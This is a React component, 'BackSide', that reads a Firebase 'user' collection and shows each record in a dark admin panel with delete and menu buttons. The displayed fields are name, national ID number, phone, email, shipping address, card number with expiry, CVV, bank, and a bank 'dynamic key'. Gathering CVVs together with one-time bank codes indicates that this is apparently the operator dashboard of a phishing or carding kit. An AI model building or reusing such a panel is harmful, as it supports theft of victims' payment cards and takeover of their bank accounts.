import React from 'react'
import { useState,useEffect } from 'react'
import { db,onSnapshot,query ,collection} from '../Firebase/FirebaseConfig'
import BtnDelete from './componentsBackSide/BtnDelete'
import Campos from './componentsBackSide/Campos'
import Menu from './componentsBackSide/Menu'


const BackSide = () => {
   const [userData,setUsersData]=useState([])

   useEffect(() => {
    const q = query(collection(db, 'user'))
    
    const onSuscribe = onSnapshot(q, (usersActive) => {
        
        let users = [];
        usersActive.forEach((doc) => {
            users.push({ ...doc.data(), idF: doc.id })
        })
        setUsersData(users)
    })

    return () => { onSuscribe() }
}, [])
   
    return (
        <div className='bg-stone-900 h-screen pb-20 overflow-x-hidden'>
            <div className='h-full'>
                <header className='w-full h-20 text-white flex flex-col items-center justify-around'>
                    <div className=''></div>
                    <span className=''>Informacion de Usuarios</span>
                </header>

                <div className='w-screen px-12 h-full overflow-y-scroll'>
                    {userData.map((item) => {
                        const {infoPay,data,dinKey}=item

                        return <div key={item.idF} className='w-full relative border-2 border-stone-600 grid  grid-cols-3
                            rounded-sm my-4 bg-neutral-800 pl-8 pr-4 py-3 text-sm'
                        >
                            <div className='absolute bg-red-500 -left-8 top-0'>
                               <BtnDelete idF={item?.idF}/>
                            </div>
                            <div className=' text-white flex flex-col'>
                               <Campos field={"Nombre y Apellido"} data={infoPay?.name}
                                    colorField={"text-blue-600"}
                               />
                               <Campos field={"Cédula"} data={infoPay?.CI}
                                    colorField={"text-red-600"}
                               />
                               <Campos field={"Celular"} data={infoPay?.cel}
                                    colorField={"text-orange-600"}
                               />
                               <Campos field={"Email"} data={infoPay?.email}
                                    colorField={"text-rose-500"}
                               />
                                <Campos field={"Direccion de envio"} data={infoPay?.direc}
                                    colorField={"text-green-400"}
                               />
                            </div>
                            
                            <div className=' text-white flex flex-col col-span-1 mx-1'>
                               <Campos field={"Ciudad de envio"} data={infoPay?.city}
                                    colorField={"text-sky-500"}
                               />
                               <Campos field={"TC"} data={data?.TC+` | `+data?.año+` | `+data?.mes}
                                    colorField={"text-amber-400"}
                               />
                                <Campos field={"CVV"} data={data?.cvv}
                                    colorField={"text-amber-400"}
                               />
                               <Campos field={"Banco"} data={data?.bank}
                                    colorField={"text-emerald-400"}
                                    />
                                
                                <Campos field={"Clave Dinamica"} data={dinKey}
                                    colorField={"text-orange-400"}
                               />
                            </div>
                            
                            <Menu idF={item.idF}/>
                            
                        </div>
                    })}
                </div>
                <div className='opacity-0 w-full h-20'>s</div>
            </div>
        </div>
    )
}

export default BackSide